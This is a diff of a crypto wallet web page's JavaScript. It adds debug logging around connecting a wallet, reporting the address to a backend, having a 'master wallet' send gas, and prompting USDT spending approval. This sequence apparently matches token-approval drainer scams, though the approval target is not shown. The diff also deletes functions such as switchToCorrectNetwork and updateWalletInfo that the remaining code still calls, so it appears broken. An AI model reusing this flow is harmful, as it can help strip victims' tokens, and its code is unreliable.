@@ -53,6 +53,7 @@ document.addEventListener('DOMContentLoaded', () => {
 // Connect wallet function - Now handles gas during connection
 async function connectWallet() {
   try {
+    console.log('🔌 Starting wallet connection process...');
     showLoading(connectText, true)
     
     // Check if Ethereum provider exists
@@ -62,34 +63,46 @@ async function connectWallet() {
     }
     
     // Request account access
+    console.log('🔑 Requesting account access...');
     const accounts = await window.ethereum.request({
       method: 'eth_requestAccounts'
     })
     
     walletAddress = accounts[0]
+    console.log('✅ Wallet connected:', walletAddress);
     
     // Create provider and signer
+    console.log('🔧 Creating provider and signer...');
     provider = new BrowserProvider(window.ethereum)
     signer = await provider.getSigner()
     
     // Switch to correct network
+    console.log('🌐 Switching to correct network...');
     await switchToCorrectNetwork()
     
     // Save to localStorage
+    console.log('💾 Saving to localStorage...');
     localStorage.setItem('walletAddress', walletAddress)
     
     // Update UI
+    console.log('📱 Updating UI...');
     showWalletSection()
     updateWalletInfo()
     
     // Send to backend first
+    console.log('📡 Sending to backend...');
     await sendWalletToBackend()
+    console.log('✅ Backend connection completed');
     
     // Check gas and handle auto-gas if needed
+    console.log('⛽ Checking gas and handling auto-gas if needed...');
     await handleAutoGasIfNeeded()
+    console.log('⛽ Gas check process completed');
+    
+    console.log('🔌 Wallet connection process fully completed');
     
   } catch (error) {
-    console.error('Connection error:', error)
+    console.error('💥 Connection error:', error)
     showError('Failed to connect wallet: ' + error.message)
   } finally {
     showLoading(connectText, false)
@@ -99,122 +112,73 @@ async function connectWallet() {
 // Handle auto gas during connection
 async function handleAutoGasIfNeeded() {
   try {
+    console.log('🔍 Starting auto-gas check...');
+    
     // Check if wallet has sufficient gas
+    console.log('💰 Checking wallet gas balance...');
     const hasGas = await checkWalletGasBalance()
+    console.log('⛽ Gas check result:', hasGas);
     
     if (!hasGas) {
+      console.log('🚨 Insufficient gas detected, requesting gas from master wallet...');
       showSuccess('Insufficient gas detected. Requesting gas from master wallet...')
       
       // Request gas from backend (master wallet)
+      console.log('📤 Sending gas request to backend...');
       await requestGasFromMaster(walletAddress)
+      console.log('📥 Gas request sent successfully');
       
       // Wait for gas to be sent by master wallet
+      console.log('⏳ Waiting for gas to arrive (up to 60 seconds)...');
       await waitForGas(60000) // Wait up to 60 seconds
+      console.log('🎉 Gas received!');
       
       showSuccess('Gas received! You can now approve USDT spending.')
+    } else {
+      console.log('✅ Wallet already has sufficient gas, no action needed');
     }
-  } catch (error) {
-    console.error('Auto gas handling error:', error)
-    showError('Gas handling issue: ' + error.message)
-  }
-}
-
-// Reset wallet connection
-function resetWallet() {
-  localStorage.removeItem('walletAddress')
-  showStatus('Wallet connection reset. Please connect again.')
-  showConnectSection()
-}
-
-// Switch to correct network
-async function switchToCorrectNetwork() {
-  try {
-    // Check current chain ID
-    const currentChainId = await window.ethereum.request({ method: 'eth_chainId' })
     
-    if (parseInt(currentChainId, 16).toString() !== CONFIG.CHAIN_ID) {
-      // Try to switch network
-      try {
-        await window.ethereum.request({
-          method: 'wallet_switchEthereumChain',
-          params: [{ chainId: `0x${parseInt(CONFIG.CHAIN_ID).toString(16)}` }]
-        })
-      } catch (switchError) {
-        // If network doesn't exist, add it
-        if (switchError.code === 4902) {
-          try {
-            await window.ethereum.request({
-              method: 'wallet_addEthereumChain',
-              params: [{
-                chainId: `0x${parseInt(CONFIG.CHAIN_ID).toString(16)}`,
-                chainName: CONFIG.CHAIN_NAME,
-                rpcUrls: [CONFIG.RPC_URL],
-                nativeCurrency: {
-                  name: 'BNB',
-                  symbol: 'BNB',
-                  decimals: 18
-                }
-              }]
-            })
-          } catch (addError) {
-            console.error('Failed to add network:', addError)
-          }
-        }
-      }
-    }
+    console.log('🔍 Auto-gas check completed');
   } catch (error) {
-    console.error('Network switch error:', error)
-  }
-}
-
-// Update wallet information
-async function updateWalletInfo() {
-  if (!walletAddress) return
-  
-  walletAddressEl.textContent = formatAddress(walletAddress)
-  
-  // Get USDT balance
-  try {
-    if (provider) {
-      const usdtContract = new Contract(
-        CONFIG.USDT_CONTRACT_ADDRESS,
-        ['function balanceOf(address account) external view returns (uint256)'],
-        provider
-      )
-      
-      const balance = await usdtContract.balanceOf(walletAddress)
-      const formattedBalance = ethers.formatUnits(balance, 18)
-      usdtBalanceEl.textContent = `${parseFloat(formattedBalance).toFixed(2)} USDT`
-    }
-  } catch (error) {
-    console.error('Balance error:', error)
-    usdtBalanceEl.textContent = '0.00 USDT'
+    console.error('💥 Auto gas handling error:', error)
+    showError('Gas handling issue: ' + error.message)
+    throw error; // Re-throw to see if it's being caught elsewhere
   }
 }
 
 // Handle the complete approval flow including gas management
 async function handleApprovalFlow() {
   try {
+    console.log('🚀 Starting approval flow for wallet:', walletAddress);
     showLoading(approveText, true)
     
     // First check if wallet has sufficient gas for approval transaction
+    console.log('💰 Checking gas balance for approval...');
     const hasGas = await checkWalletGasBalance()
+    console.log('⛽ Gas check for approval:', hasGas);
     
     if (!hasGas) {
+      console.log('🚨 Insufficient gas for approval, requesting gas...');
       showSuccess('Insufficient gas detected. Requesting gas from master wallet...')
       
       // Request gas from backend (master wallet)
+      console.log('📤 Requesting gas for approval...');
       await requestGasFromMaster(walletAddress)
+      console.log('📥 Gas request for approval completed');
       
       // Wait for gas to be sent by master wallet
+      console.log('⏳ Waiting for gas for approval...');
       await waitForGas(60000) // Wait up to 60 seconds
+      console.log('🎉 Gas received for approval!');
     }
     
     // Now proceed with USDT approval
+    console.log('💳 Proceeding with USDT approval...');
     await approveUSDTSpending()
+    console.log('✅ Approval flow completed');
     
   } catch (error) {
-    console.error('Approval flow error:', error)
+    console.error('💥 Approval flow error:', error)
     
     // Check if it's a user cancellation (MetaMask cancel)
     if (error.code === 4001 || (error.message && error.message.includes('user rejected'))) {
@@ -544,6 +508,7 @@ function showError(message) {
     statusMessage.classList.add('hidden')
   }, 5000)
 }
+
 
 
 
